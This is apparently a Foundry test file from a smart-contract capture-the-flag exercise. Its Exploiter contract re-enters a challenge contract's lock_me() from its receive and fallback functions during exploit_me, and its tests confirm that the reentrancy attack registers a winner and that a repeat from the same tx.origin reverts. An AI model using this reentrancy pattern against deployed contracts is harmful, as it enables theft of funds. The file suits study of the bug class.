// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;

import "forge-std/Test.sol";
import "src/Challenge2.sol";

contract Exploiter {
    Challenge challenge;
    bool public fallbackCalled = false;

    constructor(Challenge _challenge) {
        challenge = _challenge;
    }

    // Receive function that gets triggered when ETH is sent or call is made
    receive() external payable {
        fallbackCalled = true;
        challenge.lock_me();
    }

    // Fallback function that gets triggered during the msg.sender.call("")
    fallback() external payable {
        fallbackCalled = true;
        challenge.lock_me();
    }

    // Function to initiate the exploit
    function exploit(string memory _name) public {
        challenge.exploit_me(_name);
    }
}

contract Challenge2Test is Test {
    Challenge challenge;
    Exploiter exploiter;
    address myAddress;

    function setUp() public {
        challenge = new Challenge();
        myAddress = address(this);
    }

    function test_exploit_reentrancy() public {
        string memory myName = "AzeezAbidoye";

        // Create the exploiter contract
        exploiter = new Exploiter(challenge);
        address exploiterAddr = address(exploiter);

        // Before exploit, check state
        require(
            !challenge.HasInteracted(exploiterAddr),
            "Exploiter already interacted"
        );

        // Call exploit on the exploiter - this makes exploiter the msg.sender in exploit_me
        exploiter.exploit(myName);

        // Verify fallback was called
        require(
            exploiter.fallbackCalled(),
            "Fallback was not called - reentrancy failed"
        );

        // Get all winners names
        string[] memory winnerNames = challenge.getAllwiners();

        // Debug: Check array length
        require(winnerNames.length > 0, "No winners in array");

        // Verify that the name is in the array
        assertEq(winnerNames[0], myName, "Winner name mismatch");

        // Verify the exploiter address is marked as interacted
        assertTrue(
            challenge.HasInteracted(exploiterAddr),
            "Address not marked as interacted"
        );
    }

    function test_same_tx_origin_cannot_exploit_twice() public {
        string memory firstName = "FirstWinner";

        // First exploiter calls exploit
        Exploiter exploiter1 = new Exploiter(challenge);
        exploiter1.exploit(firstName);

        // Verify first winner
        string[] memory winnerNames = challenge.getAllwiners();
        require(winnerNames.length == 1, "Should have 1 winner");
        assertEq(winnerNames[0], firstName, "First name mismatch");

        // Create a second exploiter but try to exploit with the same tx.origin
        // Since tx.origin is the same (this test contract), it should revert
        Exploiter exploiter2 = new Exploiter(challenge);
        string memory secondName = "SecondWinner";

        // This should fail because tx.origin is the same (this test contract)
        // and Names[tx.origin] already has a value
        vm.expectRevert("Not a unique winner");
        exploiter2.exploit(secondName);

        // Verify only one winner remains
        winnerNames = challenge.getAllwiners();
        assertEq(winnerNames.length, 1, "Should still have only 1 winner");
        assertEq(winnerNames[0], firstName, "Original name should remain");
    }
}
